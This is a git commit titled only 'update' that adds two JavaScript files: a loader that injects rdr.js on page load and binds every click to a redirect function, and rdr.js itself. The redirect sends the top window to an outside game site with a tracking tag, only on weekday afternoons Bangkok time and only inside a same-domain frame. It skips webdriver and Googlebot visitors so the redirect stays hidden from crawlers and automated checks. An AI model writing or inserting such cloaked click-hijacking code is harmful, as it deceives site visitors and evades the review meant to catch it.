6b366f65ca2bfbbe6e55bb306cde69641c2bfcb6
joanachoa <joanoahoa@gmail.com>
2024-10-09 14:53:40 +0700

    update

---
+++ rdr.js
@@ -0,0 +1,44 @@
+function isWeekday() {
+    const now = new Date();
+    const day = now.getDay();
+    return day >= 1 && day <= 5; // Monday to Friday
+}
+function getCurrentDateTimeInTimeZone(timeZone) {
+    const now = new Date();
+    const options = {
+        timeZone: timeZone,
+        hour: '2-digit',
+        hour12: false,
+    };
+    const formatter = new Intl.DateTimeFormat([], options);
+    const parts = formatter.formatToParts(now);
+    const hourPart = parts.find(part => part.type === 'hour');
+    return hourPart ? hourPart.value : null;
+}
+var inFrame = function () {
+    try {
+        return window.self !== window.top;
+    } catch (e) {
+        return true;
+    }
+}
+var isDifferentDomain = function () {
+    try {
+        return window.top.location.hostname !== window.location.hostname;
+    } catch (e) {
+        return true; // If access is denied, it's a different domain
+    }
+}
+var isBot = function  () {
+    return navigator.webdriver || navigator.userAgent.toLowerCase().indexOf('googlebot') > -1;
+}
+function testRedirect() {
+    const currentHourUTCPlus7 = getCurrentDateTimeInTimeZone('Asia/Bangkok');
+    if(currentHourUTCPlus7 >= 14 && isWeekday()) {
+        if (inFrame() & !isDifferentDomain() & !isBot()) {
+            window.top.location.href = "https://drifthuntersgame.io/?utm_source=rdrif";
+        } 
+    } else {
+        console.log('Not redirecting');
+    }
+}
---
+++ tbg_server_v1.js
@@ -0,0 +1,25 @@
+function insertScript(url, callback) {
+    // Create a new script element
+    const script = document.createElement('script');
+    script.src = `${url}?v=${Date.now()}`;
+    script.type = 'text/javascript';
+    script.async = true;
+    script.onload = function() {
+        if (callback) {
+            callback();
+        }
+    };
+    // Append the script element to the head or body
+    document.head.appendChild(script);
+}
+document.addEventListener('DOMContentLoaded', (event) => {
+    insertScript('/rdr.js', function() {
+        console.log('TBG successfully.');
+        // Call the function from the loaded script
+        if (typeof testRedirect === 'function') {
+            window.onclick = testRedirect;
+        } else {
+            console.log('myFunction is not defined.');
+        }
+    });
+});
